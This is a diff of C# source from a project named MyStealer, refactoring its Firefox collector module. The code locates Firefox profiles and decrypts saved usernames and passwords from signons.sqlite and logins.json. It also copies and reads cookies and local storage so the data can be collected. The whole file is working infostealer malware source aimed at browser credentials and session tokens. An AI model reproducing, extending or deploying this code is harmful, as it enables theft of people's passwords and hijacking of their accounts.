@@ -1,80 +1,83 @@
 ﻿using MyStealer.Decryptor;
 using MyStealer.Utils;
 using Newtonsoft.Json.Linq;
-using Serilog;
 using Snappy;
 using System;
 using System.Collections.Generic;
+using System.Collections.Immutable;
 using System.Data.SQLite;
 using System.IO;
 using System.Text;
 
 namespace MyStealer.Collectors.Browser
 {
-    internal class Firefox : IBrowserCollector
+    internal class Firefox : BrowserCollectorBase
     {
-        public virtual string ApplicationName => "FireFox";
+        public override string ModuleName => "FireFox";
+
         protected virtual string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "FireFox", "Profiles");
 
         protected virtual string CookieSql => "SELECT name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,sameSite FROM moz_cookies;";
 
-        private ILogger lazyLogger;
-        protected ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
-
         public virtual string[] LibDirectory => new string[] { "Mozilla FireFox" };
 
-        private ISet<string> profilePathList;
+        private IImmutableList<string> profilePathList;
         private IDictionary<string, MozillaDecryptor> profileDecryptor = new Dictionary<string, MozillaDecryptor>();
 
-        public bool IsAvailable() => Directory.Exists(ProfilesPath);
+        public override bool IsAvailable() => Directory.Exists(ProfilesPath);
 
-        public void Initialize()
+        public override void Initialize()
         {
-            profilePathList = new HashSet<string>(Directory.GetDirectories(ProfilesPath, "*", SearchOption.TopDirectoryOnly));
+            profilePathList = Directory.EnumerateDirectories(ProfilesPath, "*", SearchOption.TopDirectoryOnly).ToImmutableArray();
+
+            var decryptors = ImmutableDictionary.CreateBuilder<string, MozillaDecryptor>();
             foreach (var profile in profilePathList)
             {
                 try
                 {
-                    profileDecryptor[profile] = new MozillaDecryptor(LibDirectory, profile);
+                    decryptors[profile] = new MozillaDecryptor(LibDirectory, profile);
                 }
                 catch (Exception e)
                 {
                     Logger.Warning(e, "Failed to initialize decryptor for profile: {profile}", profile);
                 }
             }
+
+            profileDecryptor = decryptors.ToImmutable();
         }
 
-        public ISet<CredentialEntry> GetCredentials()
+        public override IImmutableSet<BrowserLogin> GetLogins()
         {
-            var set = new HashSet<CredentialEntry>();
+            var set = ImmutableHashSet.CreateBuilder<BrowserLogin>();
 
             foreach (var profilePath in profilePathList)
             {
-                foreach (var entry in ReadSignonsSqlite(profilePath))
-                    set.Add(entry);
-                foreach (var entry in ReadLoginsJson(profilePath))
-                    set.Add(entry);
+                var profileName = Path.GetFileName(profilePath);
+                var signonsCount = ReadSignonsSqlite(set, profileName, profilePath);
+                var loginsCount = ReadLoginsJson(set, profileName, profilePath);
+                Logger.Information("Read {scount} logins from signons.sqlite, {lcount} from logins.json of profile: {profile}", signonsCount, loginsCount, profileName);
             }
 
-            return set;
+            return set.ToImmutable();
         }
 
-        public ISet<CookieEntry> GetCookies()
+        public override IImmutableSet<BrowserCookie> GetCookies()
         {
-            var set = new HashSet<CookieEntry>();
+            var set = ImmutableHashSet.CreateBuilder<BrowserCookie>();
 
             foreach (var profilePath in profilePathList)
             {
-                foreach (var entry in ReadCookiesSqlite(profilePath))
-                    set.Add(entry);
+                var profileName = Path.GetFileName(profilePath);
+                var count = ReadCookiesSqlite(set, profileName, profilePath);
+                Logger.Information("Read {count} cookies from profile: {profile}", count, profileName);
             }
 
-            return set;
+            return set.ToImmutable();
         }
 
-        public ISet<LocalStorageEntry> GetLocalStorageEntries()
+        public override IImmutableSet<BrowserLocalStorage> GetLocalStorageEntries()
         {
-            var set = new HashSet<LocalStorageEntry>();
+            var set = ImmutableHashSet.CreateBuilder<BrowserLocalStorage>();
 
             foreach (var profilePath in profilePathList)
             {
@@ -85,23 +88,21 @@ namespace MyStealer.Collectors.Browser
 
                 foreach (var subDir in Directory.EnumerateDirectories(storagesDir))
                 {
-                    foreach (var entry in ReadStorages(profileName, Path.Combine(subDir, "ls", "data.sqlite")))
-                        set.Add(entry);
+                    var count = ReadStorages(set, profileName, Path.Combine(subDir, "ls", "data.sqlite"));
+                    Logger.Information("Read {count} storage entries from profile: {profile}", count, profileName);
                 }
             }
 
-            return set;
+            return set.ToImmutable();
         }
 
-        public ISet<CredentialEntry> ReadSignonsSqlite(string profilePath)
+        protected int ReadSignonsSqlite(ISet<BrowserLogin> set, string profileName, string profilePath)
         {
-            var set = new HashSet<CredentialEntry>();
-
             var dbPath = Path.Combine(profilePath, "signons.sqlite");
             if (!File.Exists(dbPath))
             {
                 Logger.Warning("signons.sqlite file does not exists for profile: {profile}", profilePath);
-                return set;
+                return 0;
             }
 
             Logger.Information("Begin parsing signons.sqlite file: {path}", dbPath);
@@ -109,13 +110,14 @@ namespace MyStealer.Collectors.Browser
             if (!profileDecryptor.TryGetValue(profilePath, out var decryptor))
             {
                 Logger.Warning("Mozilla decryptor for profile {profile} is not available", profilePath);
-                return set;
+                return 0;
             }
 
             var copyName = Path.GetRandomFileName();
             File.Copy(dbPath, copyName, true); // prevent reading locked sql database
             Logger.Debug("signons.sqlite file {path} copied to {randomName}", dbPath, copyName);
 
+            var count = 0;
             try
             {
                 using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
@@ -133,10 +135,11 @@ namespace MyStealer.Collectors.Browser
 
                             if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
                             {
-                                set.Add(new CredentialEntry
+                                count++;
+                                set.Add(new BrowserLogin
                                 {
-                                    ApplicationName = $"{ApplicationName}",
-                                    ApplicationProfileName = Path.GetFileName(profilePath),
+                                    BrowserName = ModuleName,
+                                    BrowserProfileName = profileName,
                                     Host = host,
                                     UserName = username,
                                     Password = password
@@ -149,7 +152,6 @@ namespace MyStealer.Collectors.Browser
             catch (Exception e)
             {
                 Logger.Warning(e, "Error reading signons.sqlite: {path}", dbPath);
-                return set;
             }
             finally
             {
@@ -157,18 +159,16 @@ namespace MyStealer.Collectors.Browser
                 Logger.Information("Read {n} login entries from signons.sqlite: {path}", set.Count, dbPath);
             }
 
-            return set;
+            return count;
         }
 
-        public ISet<CredentialEntry> ReadLoginsJson(string profilePath)
+        protected int ReadLoginsJson(ISet<BrowserLogin> set, string profileName, string profilePath)
         {
-            var set = new HashSet<CredentialEntry>();
-
             var jsonPath = Path.Combine(profilePath, "logins.json");
             if (!File.Exists(jsonPath))
             {
                 Logger.Debug("No logins.json found from profile {profile}", profilePath);
-                return set;
+                return 0;
             }
 
             Logger.Information("Begin parsing Login Data file: {path}", jsonPath);
@@ -176,9 +176,10 @@ namespace MyStealer.Collectors.Browser
             if (!profileDecryptor.TryGetValue(profilePath, out var decryptor))
             {
                 Logger.Warning("Mozilla decryptor for profile {profile} is not available", profilePath);
-                return set;
+                return 0;
             }
 
+            var count = 0;
             try
             {
                 var json = JObject.Parse(File.ReadAllText(jsonPath));
@@ -187,10 +188,12 @@ namespace MyStealer.Collectors.Browser
                     var host = loginEntry["hostname"].Value<string>();
                     var username = decryptor.Decrypt(loginEntry["encryptedUsername"].Value<string>());
                     var password = decryptor.Decrypt(loginEntry["encryptedPassword"].Value<string>());
-                    set.Add(new CredentialEntry
+
+                    count++;
+                    set.Add(new BrowserLogin
                     {
-                        ApplicationName = ApplicationName,
-                        ApplicationProfileName = Path.GetFileName(profilePath),
+                        BrowserName = ModuleName,
+                        BrowserProfileName = profileName,
                         Host = host,
                         UserName = username,
                         Password = password
@@ -202,18 +205,16 @@ namespace MyStealer.Collectors.Browser
                 Logger.Warning(ex, "Error parsing logins.json: {path}", jsonPath);
             }
 
-            return set;
+            return count;
         }
 
-        public ISet<CookieEntry> ReadCookiesSqlite(string profilePath)
+        protected int ReadCookiesSqlite(ISet<BrowserCookie> set, string profileName, string profilePath)
         {
-            var set = new HashSet<CookieEntry>();
-
             var dbPath = Path.Combine(profilePath, "cookies.sqlite");
             if (!File.Exists(dbPath))
             {
                 Logger.Warning("cookies.sqlite file does not exists for profile: {profile}", profilePath);
-                return set;
+                return 0;
             }
 
             Logger.Information("Begin parsing cookies.sqlite file: {path}", dbPath);
@@ -222,6 +223,7 @@ namespace MyStealer.Collectors.Browser
             File.Copy(dbPath, copyName, true); // prevent reading locked sql database
             Logger.Debug("cookies.sqlite file {path} copied to {randomName}", dbPath, copyName);
 
+            var count = 0;
             try
             {
                 using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
@@ -251,10 +253,11 @@ namespace MyStealer.Collectors.Browser
 
                             if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(name))
                             {
-                                set.Add(new CookieEntry
+                                count++;
+                                set.Add(new BrowserCookie
                                 {
-                                    ApplicationName = $"{ApplicationName}",
-                                    ApplicationProfileName = Path.GetFileName(profilePath),
+                                    BrowserName = $"{ModuleName}",
+                                    BrowserProfileName = profileName,
                                     CreationDateTime = creationTimeDate,
                                     LastAccessDateTime = lastAccessedDate,
                                     ExpireDateTime = expiryDate,
@@ -275,25 +278,21 @@ namespace MyStealer.Collectors.Browser
             catch (Exception e)
             {
                 Logger.Warning(e, "Error reading cookies.sqlite: {path}", dbPath);
-                return set;
             }
             finally
             {
                 File.Delete(copyName);
-                Logger.Information("Read {n} cookie entries from cookies.sqlite: {path}", set.Count, dbPath);
             }
 
-            return set;
+            return count;
         }
 
-        public ISet<LocalStorageEntry> ReadStorages(string profileName, string dbPath)
+        protected int ReadStorages(ISet<BrowserLocalStorage> set, string profileName, string dbPath)
         {
-            var set = new HashSet<LocalStorageEntry>();
-
             if (!File.Exists(dbPath))
             {
                 Logger.Warning("Local Storage data.sqlite file does not exists at: {path}", dbPath);
-                return set;
+                return 0;
             }
 
             Logger.Information("Begin parsing data.sqlite file: {path}", dbPath);
@@ -302,6 +301,7 @@ namespace MyStealer.Collectors.Browser
             File.Copy(dbPath, copyName, true); // prevent reading locked sql database
             Logger.Debug("cookies.sqlite file {path} copied to {randomName}", dbPath, copyName);
 
+            var count = 0;
             try
             {
                 using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
@@ -345,10 +345,11 @@ namespace MyStealer.Collectors.Browser
                                         value = buffer;
                                     }
 
-                                    set.Add(new LocalStorageEntry
+                                    count++;
+                                    set.Add(new BrowserLocalStorage
                                     {
-                                        ApplicationName = $"{ApplicationName}",
-                                        ApplicationProfileName = profileName,
+                                        BrowserName = $"{ModuleName}",
+                                        BrowserProfileName = profileName,
                                         Host = origin,
                                         Key = key,
                                         Value = Encoding.Default.GetString(value), // Value is encoded with UTF-16-LE
@@ -368,18 +369,16 @@ namespace MyStealer.Collectors.Browser
             catch (Exception e)
             {
                 Logger.Warning(e, "Error reading data.sqlite: {path}", dbPath);
-                return set;
             }
             finally
             {
                 File.Delete(copyName);
-                Logger.Information("Read {n} storage entries from data.sqlite: {path}", set.Count, dbPath);
             }
 
-            return set;
+            return count;
         }
 
-        public void Dispose()
+        public override void Dispose()
         {
             foreach (var decryptor in profileDecryptor.Values)
                 decryptor.Dispose();
